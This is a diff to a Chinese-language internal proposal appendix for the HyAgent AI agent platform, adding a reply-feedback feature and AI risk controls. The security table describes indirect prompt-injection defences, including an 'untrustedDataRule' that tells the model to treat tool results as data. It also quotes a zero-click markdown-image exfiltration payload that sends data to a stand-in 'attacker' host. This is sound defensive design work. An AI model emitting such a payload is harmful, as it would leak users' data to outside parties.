@@ -8,8 +8,8 @@
 | 項目 | 內容 |
 |---|---|
 | 文件名稱 | HyAgent 導入建議書 — 內部技術附件 |
-| 文件版本 | 1.0 |
-| 文件日期 | 2026-09-30 |
+| 文件版本 | 1.1 |
+| 文件日期 | 2026-10-14 |
 | 對應產品版本 | HyAgent v1.2.0 |
 | 機密等級 | 內部限閱 |
 
@@ -58,6 +58,7 @@ HyAgent 是一個**可嵌入既有網站、也可獨立使用的多租戶 AI Age
 | 知識庫權限（ACL） | 可見性標籤標註檔案／網站，再授權給部門、帳號或能力套餐；檢索、回答與報告一律套用使用者有效 Scope |
 | 報告產生 | 對話觸發、非同步分節產生，章節內容必以知識庫命中為依據，精確圖表數值由結構化資料計算，支援 Markdown / HTML / PDF |
 | 外部系統整合 | 統一 Connector 介面（Stub / 通用 HTTP REST / Webhook / 自訂 Adapter），回應正規化為一致的外部單號與狀態 |
+| 回覆品質回饋 | 使用者對每則回覆按讚／倒讚並附原因；伺服器保存問答快照與 ReplyTrace（檢索、工具、模型），後台可篩選、重現檢索、標記處理並看統計 |
 | 嵌入與 SDK | Widget Script 嵌入、Headless REST Client、Widget 控制與事件橋接 |
 | SSO 帳號連結 | 宿主站台以自家私鑰簽發短效 Identity Assertion，交換為 HyAgent Session |
 | Webhook | 表單送出成功後以 HMAC 簽章投遞 `form.submitted`，支援指數退避重試 |
@@ -225,6 +226,20 @@ hyagent-client ─┼── HTTPS ──> hyagent-server ──> LLM / PostgreSQ
 
 支援雲端 PaaS 部署，亦可整套地端化：`LLM_PROVIDER=local` 搭配自架 OpenAI 相容端點，Embedding 同步地端化，**選地端時絕不回退雲端**，資料不出機房。
 
+### 3.10 回覆品質回饋機制
+
+每則 AI 回覆產生時，伺服器在 Session 記一筆 `ReplyRecord`（問題、回答、服務、時間）與 `ReplyTrace`（作答模型；知識問答的檢索問句、候選數、是否用到資料表與交給模型的片段 rank / 標題 / 來源 / 分數 / 摘錄；Agent 依序呼叫的工具名稱與成敗，不記輸入）。Trace 只在伺服器與後台使用，不回傳前台。
+
+| 項目 | 規格 |
+|---|---|
+| 使用者端 API | `PUT /api/conversations/:id/replies/:replyId/feedback`（rating = up / down；倒讚可帶 reason 與 500 字內 comment）、`DELETE` 同路徑取消。只收 replyId，問答由伺服器從 ReplyRecord 取出做快照，前台無法偽造內容；對話歸屬沿用跨租戶 404、他人 403。不呼叫 LLM，不套月配額 |
+| 原因代碼 | `wrong` 答錯了、`not_answered` 沒回答到問題、`outdated` 資料過時、`inappropriate` 內容不恰當、`other` 其他 |
+| 儲存 | 每筆一列（`reply_feedback`，migration `0020`），data 為 ReplyFeedback 整包；快照與 Session 分開保存，對話被清除後評價仍在。同一使用者對同一回覆改評即覆寫 |
+| 後台 API | `GET /api/admin/tenants/:id/feedback`（依 rating / status / serviceId / reason 篩選，游標分頁每頁 10 筆）、`GET …/feedback/stats?days=`（7／30／90）、`PATCH …/feedback/:feedbackId`（open / resolved 與 200 字內處理說明） |
+| 後台介面 | 租戶頁「回饋」分頁：統計（評價數、讚的比例、待處理倒讚、各服務評價、倒讚原因分布）、可篩選清單、詳情（問答、檢索紀錄、工具、模型、初步判斷），以及「用這題測試檢索」以提問者身分重跑檢索 |
+| 初步判斷 | 依序套用：知識問答零片段且未用資料表 →「沒檢索到資料：知識庫可能缺這份內容，或提問者沒有權限看到」；原因為資料過時 →「請更新下列來源」；答錯但有片段 →「請確認片段內容是否正確，或是模型理解錯誤」 |
+| 保存期限 | `FEEDBACK_RETENTION_DAYS`（預設 180、上限 3650），以使用者最後一次評價時間為準；標記處理不延長保存期限 |
+
 ---
 
 ## 4. 資安規劃
@@ -273,6 +288,7 @@ hyagent-client ─┼── HTTPS ──> hyagent-server ──> LLM / PostgreSQ
 | 外部系統憑證 | 租戶集中管理，表單僅保存 Credential Reference；敏感值僅可新增或輪替，**不可明文讀回** |
 | 機密設定 | 密碼、JWT Secret、管理金鑰與 LLM API Key 不得寫入前端 Bundle 或日誌 |
 | 租戶讀取回應 | 不含任何密鑰與 LLM 設定；LLM 設定走專用遮罩端點 |
+| 對話與評價紀錄 | DB 模式下已完成的 Session 30 天、閒置 Session 90 天自動清除（連同孤兒附件）；回覆評價依 `FEEDBACK_RETENTION_DAYS` 清除 |
 
 ### 4.6 AI 特有風險控管
 
@@ -285,6 +301,11 @@ hyagent-client ─┼── HTTPS ──> hyagent-server ──> LLM / PostgreSQ
 | 幻覺與虛構企業規定 | 知識問答查無資料須誠實告知；報告章節必以檢索命中為依據，精確數值由結構化資料計算 |
 | SSRF | HTML / PDF 報告渲染不得任意存取外部網路 |
 | 條款連結濫用 | 欄位條款 URL 僅允許 `http(s)://` 或站內單斜線路徑，於 Definition 驗證階段擋下 |
+| 間接提示注入 | 知識片段、資料表內容、MCP 工具結果與工具說明以 `<external-data>` 包起來（內容自帶的同名標籤先中和，防提前閉合）；system prompt 加入 `untrustedDataRule`，明訂框內與所有工具結果只是資料；MCP 工具說明另以 `sanitizeExternalText` 清除控制、零寬與雙向覆寫字元並截斷。這是降低成功率的一層，真正的邊界仍是 Scope 檢查與寫入確認 |
+| 經由回覆外洩資料 | 前台 `SafeMarkdown`：圖片一律不載入只留 alt（防 `![](https://attacker/?d=…)` 零點擊外洩），連結僅放行 `http(s)` / `mailto` 並帶 `noopener noreferrer`，不掛 `rehype-raw` |
+| Agent 自主操作 | 只暴露 `toolRegistry.availableFor`（Scope 且 `agentExposed`）的工具，幻想的工具名一律回錯誤；寫入工具（effect 非 read）先跑與 invoke 相同的權限與輸入驗證，只建 `pendingAction` 確認卡片，使用者確認後才由後端執行，一輪最多一張；tool-loop 上限 10 圈，撞上限以 `toolChoice='none'` 收尾、交代進度且不得宣稱完成 |
+| MCP 呼叫身分 | 每個請求附 60 秒 ES256 JWT（audience = serverId，帶租戶、使用者與 Scope），服務端以 JWKS 驗章後須再做資料授權 |
+| 回答品質失控 | 使用者倒讚與原因、ReplyTrace 與後台重現檢索，見 3.10 |
 
 ### 4.7 流量保護與濫用防範
 
@@ -298,6 +319,7 @@ hyagent-client ─┼── HTTPS ──> hyagent-server ──> LLM / PostgreSQ
 
 - 管理動作、工具執行與跨使用者報告下載皆留稽核紀錄，內容包含操作者、工具、時間、結果與錯誤摘要。
 - DB 模式保留稽核全史。
+- 被評價的回覆保留 ReplyTrace（檢索片段、工具與成敗、模型），可追查單則回覆的作答依據。
 - 稽核紀錄可識別表單、Integration 與外部系統單號，供事後對帳與爭議釐清。
 - 建議追蹤的安全類指標：401 / 403 / 404 / 413 / 429 / 5xx 與 CORS 相關錯誤率。
 
@@ -397,7 +419,7 @@ hyagent-client ─┼── HTTPS ──> hyagent-server ──> LLM / PostgreSQ
 |---|---|
 | 採用度 | 對話建立數、有效互動使用者數、租戶活躍率 |
 | 表單效率 | 開始率、完成率、取消率、失敗率、平均完成輪數 |
-| AI 品質 | 首次欄位抽取正確率、人工修正率 |
+| AI 品質 | 首次欄位抽取正確率、人工修正率、回覆讚的比例、倒讚原因分布、待處理倒讚數 |
 | 知識品質 | 問答命中率、無結果率、權限過濾後零命中率 |
 | 報告 | 完成率、平均產生時間、空報告率、下載率 |
 | 整合可靠度 | Webhook 成功率、重試次數、最終失敗率 |
@@ -439,6 +461,7 @@ hyagent-client ─┼── HTTPS ──> hyagent-server ──> LLM / PostgreSQ
 9. 表單送出可觸發具 HMAC 簽章的 Webhook。
 10. 管理者可查看用量、報告與稽核紀錄，且稽核能識別表單、Integration 與外部單號。
 11. 跨租戶存取、無效 Token、未允許 Origin 與超出配額皆被後端拒絕並回明確錯誤。
+12. 使用者可對回覆按讚／倒讚並選原因；管理者可在「回饋」分頁看到該則回覆的檢索紀錄與工具呼叫、以提問者身分重跑檢索，並標記已處理。
 
 ### 7.4 現階段限制與因應（誠實揭露）
 
